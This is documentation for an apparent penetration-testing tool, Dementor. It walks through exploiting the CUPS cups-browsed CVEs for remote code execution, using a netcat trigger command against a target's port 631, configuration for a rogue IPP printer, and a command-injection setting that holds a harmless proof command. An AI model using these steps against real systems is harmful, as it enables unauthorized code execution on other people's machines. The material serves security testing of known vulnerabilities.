.. _example_cups:

Abusing CUPS for RCE
====================

Since version ``1.0.0.dev10``, *Dementor* can be used to exploit `CVE-2024-47076 <https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5>`_
and `CVE-2024-47175 <https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6>`_. **However**, several aspects
must be kept in mind before attempting to run the exploit:

.. attention::

    1. You need a vulnerable version of the `cups-browsed` service running
    2. The ``foomatic-db-engine`` must be installed for the RCE to be triggered correctly
    3. You must be able to start a print job on the target machine


Triggering ``get-printer-attributes`` Requests
----------------------------------------------

First things first, let's revisit `Attacking UNIX Systems via CUPS, Part I <https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/>`_
and `CVE-2024-47176 <https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8>`_ again. The general
format of requests that will trigger a ``get-printer-attributes`` request is as follows:

.. code-block:: bnf

    REQUEST := 0 <SPACE> 3 <SPACE> <URL> <SPACE> "<LOCATION>" <SPACE> "<INFO>"

By echoing a specific broadcast string into netcat, we can trigger the target's printer to
send an HTTP request back to us:

.. code-block::
    :caption: Command to trigger a ``get-printer-attributes`` request

    echo '0 3 http://<LOCAL_IP>:<LOCAL_PORT>/printers/data1 "Office" "Printer"' \
        | nc -nu <TARGET_IP> 631

The configuration necessary to capture IPP requests with *Dementor* is:

.. tab-set::

    .. tab-item:: Dementor.toml

        .. code-block:: toml
            :emphasize-lines: 3

            [Dementor]
            # [...]
            IPP = true
            # [...]

    .. tab-item:: CLI

        .. code-block:: console

            $ Dementor -I "$INTERFACE" -O IPP=On -O IPP.Port=4444

On success, *Dementor* will display the captured request:

.. container:: demo

    .. code-block:: console

        # [...]
        IPP  192.168.56.124  4444  [*] IPP-Request: <GET_PRINTER_ATTRIBUTES> (Version: 2.0, ID: 0x1c)
        IPP  192.168.56.124  4444  [+] Serving IPP printer PRINTER_NAME_HERE
        # [...]

.. note::

    The CUPS client will automatically send the `get-printer-attributes` request when it
    discovers a remote printer via cups-browsed.


Abusing CVE-2024-47175 / CVE-2024-47076
---------------------------------------

To exploit these vulnerabilities, we must configure the command to be injected. (*Dementor* will
display this configured command in the IPP response)

.. tab-set::

    .. tab-item:: Dementor.toml

        .. code-block:: toml
            :emphasize-lines: 3

            [Dementor]
            # [...]
            IPP = true
            # [...]

            [IPP]
            RemoteCmd = "echo 1 > /tmp/I_AM_VULNERABLE"

    .. tab-item:: CLI

        .. code-block:: console

            $ Dementor -I "$INTERFACE" -O IPP=On -O IPP.Port=4444 \
                -O IPP.RemoteCmd="echo 1 > /tmp/I_AM_VULNERABLE"

After triggering a ``get-printer-attributes`` request, the `cups-browsed` service should show debug output similar to this:

.. figure:: /_static/images/ipp_cups-browsed.png
    :align: center

    `cups-browsed` debug output during remote printer discovery. (version: 2.0.1)

To confirm the injection worked, inspect the PPD file generated in ``/etc/cups/ppd``:

.. figure:: /_static/images/ipp_cups-ppd_file.png
    :align: center

    Generated PPD file contains injected attributes that will be used on the next print attempt.

.. note::

    The next step would be to start a print job using the newly registered printer. However, for
    the RCE to work, `foomatic` must be installed on the target system.

